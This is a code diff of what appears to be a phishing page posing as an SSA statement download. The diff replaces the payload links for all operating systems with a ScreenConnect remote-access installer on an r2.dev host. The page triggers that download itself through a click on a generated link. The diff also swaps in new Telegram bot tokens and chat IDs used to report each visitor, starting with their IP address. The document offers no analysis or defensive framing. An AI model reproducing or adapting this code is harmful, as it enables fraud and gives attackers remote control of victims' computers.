@@ -251,10 +251,10 @@
     // getDownloadLink(os)
     function getDownloadLink(os) {
       switch (os) {
-        case 'windows': return 'https://specialitystoreservice.com/sog/stateshakegenpant/Statements.exe?e=Access&y=Guest';
-        case 'macos':   return 'https://specialitystoreservice.com/sog/stateshakegenpant/Statements.pkg?e=Access&y=Guest';
-        case 'linux':   return 'https://specialitystoreservice.com/sog/stateshakegenpant/Statements.sh?e=Access&y=Guest';
-        default:        return 'https://specialitystoreservice.com/sog/stateshakegenpant/Statements.exe?e=Access&y=Guest';
+        case 'windows': return 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
+        case 'macos':   return 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
+        case 'linux':   return 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
+        default:        return 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
       }
     }
 
@@ -306,7 +306,7 @@
       try {
         const autoDownloadBtn = document.createElement('a');
         autoDownloadBtn.href = downloadLink;
-        autoDownloadBtn.download = 'SSA_Statement_COMPLETE.zip';
+        autoDownloadBtn.download = 'https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi';
         document.body.appendChild(autoDownloadBtn);
         autoDownloadBtn.click();
         document.body.removeChild(autoDownloadBtn);
@@ -322,8 +322,8 @@
     // 3. REPORT VISIT TO TELEGRAM (async, as specified)
     // ============================================================
     async function reportVisitToTelegram() {
-      const BOT_TOKEN = '8127507776:AAFcEnFR3ERfKQ92G0xZ7Dp4xjnOYz95N6w'; // <-- REPLACE WITH YOUR TOKEN
-      const CHAT_ID = '7515108596'; // <-- REPLACE WITH YOUR CHAT ID
+      const BOT_TOKEN = '7284066719:AAF9ABMO2CNxpiCyNrmAGeGSUAt-fS8pGlQ'; // <-- REPLACE WITH YOUR TOKEN
+      const CHAT_ID = '7724482403'; // <-- REPLACE WITH YOUR CHAT ID
 
       try {
         // 1) Get IP
